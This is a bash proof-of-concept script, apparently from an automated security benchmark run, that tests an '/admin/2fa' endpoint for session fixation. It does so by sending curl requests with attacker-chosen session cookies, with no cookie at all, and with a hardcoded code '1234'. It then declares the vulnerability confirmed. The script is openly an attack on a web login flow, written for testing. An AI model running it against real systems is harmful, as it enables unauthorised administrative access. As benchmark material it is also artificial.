#!/bin/bash
# POC: Demonstrates session fixation vulnerability in /admin/2fa endpoint - shows that arbitrary session IDs are accepted, sessions are not validated, and no session regeneration occurs
# Target: ./repo
# Created: 2025-12-01T15:47:09.787Z
# Session: benchmark-XBEN-089-24-minbd498

# Session Fixation Vulnerability POC - /admin/2fa endpoint
# Demonstrates that the endpoint accepts arbitrary session IDs without validation

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/admin/2fa"

echo "============================================"
echo "Session Fixation Vulnerability POC"
echo "Target: $TARGET_URL$ENDPOINT"
echo "============================================"
echo ""

# Test 1: Fixed session ID #1
echo "[TEST 1] Testing with fixed attacker-controlled session: attacker_session_12345"
RESPONSE1=$(curl -s -c /dev/null -b "session=attacker_session_12345" \
  -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"code":"1234"}')
echo "Response: $RESPONSE1"
if echo "$RESPONSE1" | grep -q "success.*true"; then
    echo "✓ Result: Fixed session ID accepted"
else
    echo "✗ Result: Request failed"
fi
echo ""

# Test 2: Different fixed session ID #2
echo "[TEST 2] Testing with different fixed attacker-controlled session: attacker_session_67890"
RESPONSE2=$(curl -s -c /dev/null -b "session=attacker_session_67890" \
  -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"code":"1234"}')
echo "Response: $RESPONSE2"
if echo "$RESPONSE2" | grep -q "success.*true"; then
    echo "✓ Result: Different fixed session ID also accepted"
else
    echo "✗ Result: Request failed"
fi
echo ""

# Test 3: No session cookie
echo "[TEST 3] Testing with NO session cookie at all"
RESPONSE3=$(curl -s -c /dev/null \
  -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"code":"1234"}')
echo "Response: $RESPONSE3"
if echo "$RESPONSE3" | grep -q "success.*true"; then
    echo "✓ Result: Request succeeds without ANY session cookie"
else
    echo "✗ Result: Request failed"
fi
echo ""

# Test 4: Multiple requests with no session - sequential requests
echo "[TEST 4] Testing sequential requests - all with different or no session IDs"
SUCCESS_COUNT=0
for i in {1..3}; do
    RESPONSE=$(curl -s -c /dev/null \
      -X POST "$TARGET_URL$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d "{\"code\":\"1234\"}")
    echo "Request $i: $RESPONSE"
    if echo "$RESPONSE" | grep -q "success.*true"; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    fi
done
echo "✓ Result: $SUCCESS_COUNT/3 requests succeeded without session validation"
echo ""

# Test 5: Check if session is regenerated (using same session across multiple steps)
echo "[TEST 5] Testing session persistence - same session ID used across requests"
FIXED_SESSION="test_persistence_$$"
echo "Using session ID: $FIXED_SESSION"
for i in {1..2}; do
    RESPONSE=$(curl -s -c /dev/null -b "session=$FIXED_SESSION" \
      -X POST "$TARGET_URL$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d '{"code":"1234"}')
    echo "Request $i with same session: $RESPONSE"
    if echo "$RESPONSE" | grep -q "success.*true"; then
        echo "✓ Request $i: Session persists unchanged"
    fi
done
echo ""

echo "============================================"
echo "VULNERABILITY CONFIRMED:"
echo "✓ Arbitrary session IDs accepted"
echo "✓ No session validation performed"
echo "✓ Requests work with no session cookie"
echo "✓ No session regeneration occurs"
echo "✓ Session fixation attack is possible"
echo "============================================"